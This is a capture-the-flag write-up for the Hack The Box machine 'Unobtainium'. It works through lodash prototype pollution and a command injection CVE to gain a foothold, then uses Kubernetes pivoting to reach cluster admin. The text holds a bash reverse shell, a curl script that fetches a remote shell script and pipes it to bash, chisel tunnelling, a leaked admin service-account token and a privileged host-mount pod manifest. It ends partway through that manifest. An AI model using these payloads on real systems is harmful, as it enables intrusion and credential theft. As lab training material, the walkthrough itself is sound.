---
title:     "Hack The Box - Unobtainium"
tags: [linux,hard,electron,javascript,cve,prototype pollution,kubernetes]
categories: HackTheBox
---
[![info_card](/img/unobtainium/info_card.png)](/img/unobtainium/info_card.png)

Unobtainium is a hard rated machine on HackTheBox by [felamos](https://www.hackthebox.eu/home/users/profile/27390). It involves exploiting object prototype pollution in an older `lodash` library chained together with a CVE in the `google-cloudstorage-commands` library to gain foothold on a container running a custom electron app. To gain root we will pivot around a kubernetes cluster and abuse misconfigured permissions to escalate to cluster admin and finally mount the host file system in a pod where we write an ssh key for the root user.

# User

## Nmap

As usual we start off with an initial scan against the machine and see 8 ports being open against which we run a script and version detection scan.

`All Ports`
```
$ sudo nmap -p- -T4  10.129.129.132
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 08:27 CEST
Nmap scan report for unobtainium.htb (10.129.129.132)
Host is up (0.027s latency).
Not shown: 65527 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
2379/tcp  open  etcd-client
2380/tcp  open  etcd-server
8443/tcp  open  https-alt
10250/tcp open  unknown
10256/tcp open  unknown
31337/tcp open  Elite

Nmap done: 1 IP address (1 host up) scanned in 16.34 seconds
```

`Script and version`
```
$ sudo nmap -sC -sV -p 22,80,2379,2380,8443,10250,10265,31337 10.129.129.132
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 08:35 CEST
Nmap scan report for unobtainium.htb (10.129.129.132)
Host is up (0.027s latency).                                                                     
PORT      STATE  SERVICE          VERSION
22/tcp    open   ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)                         
| ssh-hostkey:
|   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)
|   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)            
|\_  256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)
80/tcp    open   http             Apache httpd 2.4.41 ((Ubuntu))
|\_http-server-header: Apache/2.4.41 (Ubuntu)
|\_http-title: Unobtainium
2379/tcp  open   ssl/etcd-client?
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2021-01-17T07:10:30
|\_Not valid after:  2022-01-17T07:10:30
|\_ssl-date: TLS randomness does not represent time      
| tls-alpn:                                        
|\_  h2
| tls-nextprotoneg:
|\_  h2                                    
2380/tcp  open   ssl/etcd-server?
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2021-01-17T07:10:30
|\_Not valid after:  2022-01-17T07:10:30
|\_ssl-date: TLS randomness does not represent time
| tls-alpn:  
|\_  h2
| tls-nextprotoneg:  
|\_  h2
8443/tcp  open   ssl/https-alt
| fingerprint-strings:  
|   FourOhFourRequest:  
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Mon, 12 Apr 2021 06:36:35 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:  
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   HTTPOptions:  
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Mon, 12 Apr 2021 06:36:35 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.129.129.132, IP
Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2021-04-11T05:57:32
|_Not valid after:  2022-04-12T05:57:32
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   h2
|_  http/1.1
10250/tcp open   ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=unobtainium@1610865428
| Subject Alternative Name: DNS:unobtainium
| Not valid before: 2021-01-17T05:37:08
|_Not valid after:  2022-01-17T05:37:08
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   h2
|_  http/1.1
10265/tcp closed unknown
31337/tcp open   http             Node.js Express framework
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=4/12%Time=6073EA4C%P=x86_64-pc-linux-gn
...[snip]...
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.44 seconds
```


## App

On the webiste we are greeted with a download menu for a chat application called Unobtainium. Since i use parrot i opted  for the deb package and install it. This step is however not needed to complete the machine but usefull for further understanding the application.

### Source and functionality

[![download_app](/img/unobtainium/download_app.png)](/img/unobtainium/download_app.png)

Installing it with dpkg you might encounter missing dependencies which you can install using apt.

```
$ sudo dpkg -i unobtainium_1.0.0_amd64.deb
Selecting previously unselected package unobtainium.
(Reading database ... 581760 files and directories currently installed.)
```

Opening the application the `Post Messages` and the `Todo` functionality seem particularily interesting.

[![app_dashboard](/img/unobtainium/app_dashboard.png)](/img/unobtainium/app_dashboard.png)

With `Post Messages` we can send a message to the application server and the `Todo` reveals an interesting list.

[![app_todo](/img/unobtainium/app_todo.png)](/img/unobtainium/app_todo.png)

Not finding any obvious vulnerabilities except client side xss we can analyze the `app.asar` of the application at `/opt/unobtainium/resources/app.asar`. We do this by using npx to unpack the asar file for more convenience.

```
$ mkdir source
$ npx asar extract app.asar source
$ ls -la source/
total 8
drwxr-xr-x 1 jack jack  46 Apr 12 09:01 .
drwxrwxr-x 1 jack jack  28 Apr 12 09:01 ..
-rw-r--r-- 1 jack jack 503 Apr 12 09:01 index.js
-rw-r--r-- 1 jack jack 207 Apr 12 09:01 package.json
drwxr-xr-x 1 jack jack  82 Apr 12 09:01 src
```

In the src directory are multiple javascript files. Some of them seem to handle the interaction with the api server of the application.

The `app.js` contains the `Post Message functionality` and some credentials.

`app.js`
```js
$(document).ready(function(){
    $("#but_submit").click(function(){
        var message = $("#message").val().trim();
        $.ajax({
        url: 'http://unobtainium.htb:31337/',
        type: 'put',
        dataType:'json',
        contentType:'application/json',
        processData: false,
        data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"text": message}}),
        success: function(data) {
            //$("#output").html(JSON.stringify(data));
            $("#output").html("Message has been sent!");
        }
    });
});
});
```

The message log seems to be covered with the `get.js` file.

`get.js`
```js
$.ajax({
    url: 'http://unobtainium.htb:31337',
    type: 'get',

    success: function(data) {
        $("#output").html(JSON.stringify(data));
    }
});
```

The `todo.js` handles the `Todo` functionality and we can see it retrieves a todo.txt. We can also see that the application is running on the earlier discovered port 31337.

`todo.js`
```js
$.ajax({
    url: 'http://unobtainium.htb:31337/todo',
    type: 'post',
    dataType:'json',
    contentType:'application/json',
    processData: false,
    data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "todo.txt"}),
    success: function(data) {
        $("#output").html(JSON.stringify(data));
    }
});
```

Manually executing the `Todo` functionality in burp we can also retrieve the todo.txt from the server.

[![manual_todo](/img/unobtainium/manual_todo.png)](/img/unobtainium/manual_todo.png)

Entering an empty filename results in an error revealing the existence of an `index.js` file, which we can retrieve in the next request.

[![get_index](/img/unobtainium/get_index.png)](/img/unobtainium/get_index.png)

Looking at the `todo.txt` we can identify that the application may run on older software, since it is stated it should be updated. Looking at the `index.js` file we can identify two possible vulnerabilities in older javascript libraries which we might be able to exploit.

Contents of `index.js`

```js
var root = require("google-cloudstorage-commands");
const express = require('express');
const { exec } = require("child_process");
const bodyParser = require('body-parser');
const _ = require('lodash');
const app = express();
var fs = require('fs');



const users = [
  {name: 'felamos', password: 'Winter2021'},
  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},
];

let messages = [];
let lastId = 1;
function findUser(auth) {
  return users.find((u) =>
    u.name === auth.name &&
    u.password === auth.password);
}

app.use(bodyParser.json());
app.get('/', (req, res) => {
  res.send(messages);
});

app.put('/', (req, res) => {
  const user = findUser(req.body.auth || {});

  if (!user) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  const message = {
    icon: '__',
  };

  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });

  messages.push(message);
  res.send({ok: true});
});

app.delete('/', (req, res) => {
  const user = findUser(req.body.auth || {});

  if (!user || !user.canDelete) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  messages = messages.filter((m) => m.id !== req.body.messageId);
  res.send({ok: true});
});
app.post('/upload', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }


  filename = req.body.filename;
  root.upload("./",filename, true);
  res.send({ok: true, Uploaded_File: filename});
});

app.post('/todo', (req, res) => {
    const user = findUser(req.body.auth || {});
    if (!user) {
        res.status(403).send({ok: false, error: 'Access denied'});
        return;
    }

    filename = req.body.filename;
        testFolder = "/usr/src/app";
        fs.readdirSync(testFolder).forEach(file => {
                if (file.indexOf(filename) > -1) {
                        var buffer = fs.readFileSync(filename).toString();
                        res.send({ok: true, content: buffer});
                }
        });
});

app.listen(3000);
console.log('Listening on port 3000...');

```


### Object prototype pollution into RCE
The `google-cloudstorage-commands` library has a RCE vulnerability [CVE-2020-28436](https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431) in the second paramter which, is under our control. So if we can interact with the upload functionality we might be able to get code execution on the server.
Looking at the code the function checks if the user has the `canUpload` property set to `true`. Luckily for us, there is another vulnerability in an older `lodash` version within the merge function it uses in the `app.put` function, which is the `Post Message` functionality ([CVE-2018-3721](https://snyk.io/vuln/npm:lodash:20180130)).
Using this vulnerability we can pollute the object prototype properties, effectivly setting the `canUpload` property to `true` on every object. This let's us bypass the authorization check for the upload function.

[![prototype_pollution](/img/unobtainium/prototype_pollution.png)](/img/unobtainium/prototype_pollution.png)

There seem to be multiple instances of the service running, so sending the exploit several times makes it more reliable in the second stage.

Making a `POST` request to `/upload` should result in an `ok` response now.

[![upload_working](/img/unobtainium/upload_working.png)](/img/unobtainium/upload_working.png)

In the next step we abuse the command injection vulnerability in the `filename` parameter and curl a reverse shell from our machine piping it to bash.

[![get_revshell](/img/unobtainium/get_revshell.png)](/img/unobtainium/get_revshell.png)

`grem.sh`
```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.18/443 0>&1'
```

This results in a shell in what seems to be a container and we can pick up the user flag.

```
$ sudo nc -lnvp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.129.132.
Ncat: Connection from 10.129.129.132:54346.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# id
id
uid=0(root) gid=0(root) groups=0(root)
root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# ls /root
ls /root
user.txt
root@webapp-deployment-5d764566f4-mbprj:/usr/src/app#
```


# Root

## Webapp => Devpods

There is a cronjob running on the machine removing all files named kubectl from the system every minute and there is a token + cert for a kubernetes service account.

```
root@webapp-deployment-5d764566f4-mbprj:~# cat /etc/cron.d/clear-kubectl
* * * * * find / -name kubectl -exec rm {} \;
```

```
root@webapp-deployment-5d764566f4-mbprj:~# ls /run/secrets/kubernetes.io/serviceaccount/
ca.crt  namespace  token
```

Transfering kubectl over to the machine, renaming it so it does not get removed we can enumerate the namespaces in a first step.

```
root@webapp-deployment-5d764566f4-mbprj:~# notkubectl get namespaces
NAME              STATUS   AGE
default           Active   85d
dev               Active   84d
kube-node-lease   Active   85d
kube-public       Active   85d
kube-system       Active   85d
```

There are a total of 5 different namespaces and we can enumerate the pods in the dev namespace in a second command.

```
root@webapp-deployment-5d764566f4-mbprj:~# notkubectl --namespace dev get pods -o wide
NAME                                READY   STATUS    RESTARTS   AGE   IP           NODE          NOMINATED NODE   READINESS GATES
devnode-deployment-cd86fb5c-6ms8d   1/1     Running   27         84d   172.17.0.4   unobtainium   <none>           <none>
devnode-deployment-cd86fb5c-mvrfz   1/1     Running   28         84d   172.17.0.5   unobtainium   <none>           <none>
devnode-deployment-cd86fb5c-qlxww   1/1     Running   28         84d   172.17.0.6   unobtainium   <none>           <none>
root@webapp-deployment-5d764566f4-mbprj:~#
```

Looking at the environment variables we can see a service that might be running on port 3000.

```
root@webapp-deployment-5d764566f4-mbprj:~# env
YARN_VERSION=1.22.5
WEBAPP_SERVICE_PORT_3000_TCP=tcp://10.96.137.170:3000
WEBAPP_SERVICE_PORT_3000_TCP_PROTO=tcp
WEBAPP_SERVICE_PORT=tcp://10.96.137.170:3000
HOSTNAME=webapp-deployment-5d764566f4-mbprj
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
WEBAPP_SERVICE_SERVICE_PORT=3000
PWD=/root
HOME=/root
WEBAPP_SERVICE_PORT_3000_TCP_ADDR=10.96.137.170
KUBERNETES_SERVICE_PORT_HTTPS=443
canUpload=true
KUBERNETES_PORT_443_TCP_PORT=443
NODE_VERSION=14.15.4
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
WEBAPP_SERVICE_PORT_3000_TCP_PORT=3000
TERM=xterm
SHLVL=4
WEBAPP_SERVICE_SERVICE_HOST=10.96.137.170
KUBERNETES_SERVICE_PORT=443
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_SERVICE_HOST=10.96.0.1
_=/usr/bin/env
OLDPWD=/usr/src/app
```

Trying port 3000 on one of the dev-pods, we see that the port is indeed open and poking at it gives familiar results to the previous application.

```
root@webapp-deployment-5d764566f4-mbprj:~# curl 172.17.0.6:3000
[]root@webapp-deployment-5d764566f4-mbprj:~# curl -X PUT 172.17.0.6:3000
{"ok":false,"error":"Access denied"}
```

To have better access to the port we forward it to our local machine using chisel.

```
$ ./chisel server -p 8001 -reverse
2021/04/12 11:27:35 server: Reverse tunnelling enabled
2021/04/12 11:27:35 server: Fingerprint Buhu9wYAUcDN5xzHLNgW/ZWUdqIZii1YQy51G+uqeUw=
2021/04/12 11:27:35 server: Listening on http://0.0.0.0:8001
2021/04/12 11:27:43 server: session#1: tun: proxy#R:9000=>172.17.0.4:3000: Listening

```

```
root@webapp-deployment-5d764566f4-mbprj:~# ./chisel client 10.10.14.18:8001 R:9000:172.17.0.4:3000 &
[1] 3090
root@webapp-deployment-5d764566f4-mbprj:~# 2021/04/12 09:28:21 client: Connecting to ws://10.10.14.18:8001
2021/04/12 09:28:21 client: Connected (Latency 26.979212ms)
```

Putting the previous exploit into a bash script using curl we can repeat the same exploit we used to get on the first container to get a shell on a dev pod.

```bash
curl -X PUT -H 'Content-Type: application/json' http://$1:$2/ --data-binary '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"__proto__":{"canUpload":true}}}'
sleep 2
curl -X POST -H 'Content-Type: application/json' http://$1:$2/upload --data-binary '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "& curl http://10.10.14.18:8000/grem.sh | bash"}'
```

```
$ bash node_pwn.sh 127.0.0.1 9000
{"ok":true}{"ok":true,"Uploaded_File":"& curl http://10.10.14.18:8000/grem.sh | bash"}
```

```
$ sudo nc -lnvp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.129.132.
Ncat: Connection from 10.129.129.132:38748.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@devnode-deployment-cd86fb5c-6ms8d:/usr/src/app# id
id
uid=0(root) gid=0(root) groups=0(root)
root@devnode-deployment-cd86fb5c-6ms8d:/usr/src/app#
```

## Devpod => Clusteradmin

### Admin token
This pod seems to be almost identical to the web pods and the 2 other dev pods are the same. However there is a different token we can use to interact with the kubernetes cluster. There is also a cronjob removing kubectl files on the system so we repeat the same steps we did on the first pod.
Listing the permissions for the new service account on the earlier identified namespaces we can see something interesting in the kube-system namespace.

```
root@devnode-deployment-cd86fb5c-6ms8d:~# notkubectl auth can-i --list --namespace kube-system
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

This means we can retrieve secrets from the kubesystem namespace with our service account.
Listing the secrets, the `c-admin-token-tfmp2` looks particularily interesting.

```
root@devnode-deployment-cd86fb5c-6ms8d:~# notkubectl get secrets --namespace kube-system
NAME                                             TYPE                                  DATA   AGE
attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      85d
bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      85d
c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      84d
certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      85d
clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      85d
coredns-token-dbp92                              kubernetes.io/service-account-token   3      85d
...[snip]...
```

Retrieving it gives us another token to work with.

```
root@devnode-deployment-cd86fb5c-6ms8d:~# notkubectl get secret --namespace kube-system  c-admin-token-tfmp2 -o yaml
apiVersion: v1
data:
  ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUM1ekNDQWMrZ0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwdGFXNXAKYTNWaVpVTkJNQjRYRFRJeE1ERXdOekV6TWpRME9Wb1hEVE14TURFd05qRXpNalEwT1Zvd0ZURVRNQkVHQTFVRQpBeE1LYldsdWFXdDFZbVZEUVRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTVRDCmozSE9PMXRhaE1PUHpkNjhuYUtoQmVpYUFaM2lxdC9TY25lZ1RnbEttdHo1RGFnRUQ1WWFqWk0rVXl2UEVxUSsKdSttYjFaYzFLYnJjMkZnM0M0OEJZN09JUDZHZk9YOTkwUERLSmhxWnRhT0FkY1U1R2ExYXZTK2wzZG82VjJrQwplVnN0d1g2U1ZJYnpHSkVVeE1VUGlac0Z0Nkhzdk43aHRQMVA1Z2V3d3Rnc1ZJWER5TGwvZVJmd0NuMlpXK24zCk5nQzRPSTg0empWSHBYbVhGYUdzZURIYi9FNHdLL04waE1EMERFVlBKc0VPb2dITTlMbmRVZ3lKbWhBdFdiRWoKMjUrSDhBd1FpMy84UFlORXNtdFNBVUV1V3RZMzZweC9zRDVDdGhpTmxOcGtCNXQ1YzFHSzkwRG15b2ZxQmdZdgo5d2tDTkdHWktwM0F4TU1OMm5zQ0F3RUFBYU5DTUVBd0RnWURWUjBQQVFIL0JBUURBZ0trTUIwR0ExVWRKUVFXCk1CUUdDQ3NHQVFVRkJ3TUNCZ2dyQmdFRkJRY0RBVEFQQmdOVkhSTUJBZjhFQlRBREFRSC9NQTBHQ1NxR1NJYjMKRFFFQkN3VUFBNElCQVFBSEpqbzhVYzNTSDFVbnNLU3daSlR1eWozNlcvbXNiTXIwcFNuM2RsRTZCb3V1a2hGMwo5R3htVmEyYW40L1ZGSmtBc1pTcUZVejFlNTJxdkpvRkpjWGVjNE1pTjZHWlRXdVVBOUQvanFpYXBuSFdlTzh4ClJHazRXTjY2WnJhTTBYM1BxYUhvK2NiZmhLT2xMOWprVXh2RSszQld1ajlwbHlEM245dEZlM2xuYXNEZnp5NE0KcTQ2NWl4UFpxRnFWY2h4UUZRK3BaMjRLaXFvUVc0bWFtL3g1RlB5MTMrTXc4SjR6Yjh2TGR1dkxRUjN3cFVHYgp2S1hkbktPTFdzaUV4eXJqcFpqWmJZQkw4YjcwNVhGRkd2bWFicDIxYUc4cHNCMVh2c0xpR0ZRRXF5RGZlRlJXCmhsN0twVUlTbDQrTnA1c0FpWE53dGJTREUrMjJRVnRaYnVEbgotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
  namespace: a3ViZS1zeXN0ZW0=
  token: ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklrcE9kbTlpWDFaRVRFSjJRbFpGYVZwQ2VIQjZUakJ2YVdORWFsbHRhRTFVTFhkQ05XWXRiMkpXVXpnaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKakxXRmtiV2x1TFhSdmEyVnVMWFJtYlhBeUlpd2lhM1ZpWlhKdVpYUmxjeTVwYnk5elpYSjJhV05sWVdOamIzVnVkQzl6WlhKMmFXTmxMV0ZqWTI5MWJuUXVibUZ0WlNJNkltTXRZV1J0YVc0aUxDSnJkV0psY201bGRHVnpMbWx2TDNObGNuWnBZMlZoWTJOdmRXNTBMM05sY25acFkyVXRZV05qYjNWdWRDNTFhV1FpT2lJeU5EWXpOVEExWmkwNU9ETmxMVFExWW1RdE9URm1OeTFqWkRVNVltWmxNRFkyWkRBaUxDSnpkV0lpT2lKemVYTjBaVzA2YzJWeWRtbGpaV0ZqWTI5MWJuUTZhM1ZpWlMxemVYTjBaVzA2WXkxaFpHMXBiaUo5LlhrOTZwZEM4d25CdUlPbTRDZ3VkOVE3enBvVU5ISUNnN1FBWlk5RVZDZUFVSXpoNnJ2ZlpKZWFIdWNNaXE4Y205M3pLbXdIVC1qVmJBUXlOZmFVdWFYbXVlazVUQmRZOTRrTUQ1QV9vd0ZoLTBrUlVqTkZPU3Izbm9ROFhGX3huV21kWDk4bUtNRi1ReE9aS0NKeGtibkxMZF9oLVAyaFdSa2ZZOHhxNi1lVVA4TVlyWUZfZ3M3WG0yNjRBMjJoclZaeFRiMmpaalVqN0xURlJjaGI3YkoxTFdYU0lxT1YyQm1VOVRLRlFKWUNaNzQzYWJlVkI3WXZOd1BIWGNPdExFb0NzMDNodkVCdE9zZTJQT3pONTRwSzhMeXFfWEdGSk4weVRKdXVRUUx0d3JvRjM1NzlEQmJaVWtkNEpCUVFZcnBtNldkbTl0amJPeUdMOUtSc05vdw==
kind: Secret
metadata:
...[snip]...
```

Decoding the base64 we export the token to be an environment variable to use it to interact with the cluster.
With the new token we now have administrative access on the kubernetes cluster and can list all pods.

```
root@devnode-deployment-cd86fb5c-6ms8d:~# export TOKEN='eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow'
root@devnode-deployment-cd86fb5c-6ms8d:~# notkubectl --token $TOKEN get pods --all-namespaces
NAMESPACE     NAME                                  READY   STATUS      RESTARTS   AGE
default       webapp-deployment-5d764566f4-h5zhw    1/1     Running     6          55d
default       webapp-deployment-5d764566f4-lrpt9    1/1     Running     6          55d
default       webapp-deployment-5d764566f4-mbprj    1/1     Running     6          55d
dev           devnode-deployment-cd86fb5c-6ms8d     1/1     Running     27         84d
dev           devnode-deployment-cd86fb5c-mvrfz     1/1     Running     28         84d
dev           devnode-deployment-cd86fb5c-qlxww     1/1     Running     28         84d
kube-system   backup-pod                            0/1     Completed   112        83d
kube-system   coredns-74ff55c5b-sclll               1/1     Running     30         85d
kube-system   etcd-unobtainium                      1/1     Running     0          3h59m
kube-system   kube-apiserver-unobtainium            1/1     Running     0          3h59m
kube-system   kube-controller-manager-unobtainium   1/1     Running     32         85d
kube-system   kube-proxy-zqp45                      1/1     Running     30         85d
kube-system   kube-scheduler-unobtainium            1/1     Running     30         85d
kube-system   storage-provisioner                   1/1     Running     62         85d
```

### Mounting the host filesystem

The plan here is to create a new container with full permissions, mount the host filesystem in it and write a ssh key into the root's ssh directory.

For this we first identify an image we can access and which we can use to build our container.

```
root@devnode-deployment-cd86fb5c-6ms8d:~# notkubectl --token $TOKEN get deployments -o wide
NAME                 READY   UP-TO-DATE   AVAILABLE   AGE   CONTAINERS   IMAGES	SELECTOR
devnode-deployment   3/3     3            3           84d   devnode      localhost:5000/node_server   app=devnode
```

Then we modify the yaml file from [this github repository](https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed) to fit our needs, create and start a new container using it.

```
root@devnode-deployment-cd86fb5c-6ms8d:~# notkubectl --token $TOKEN apply -f grem.yaml
pod/grem created
```

`grem.yaml`
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: grem
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: gremmo
    image: localhost:5000/node_server
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
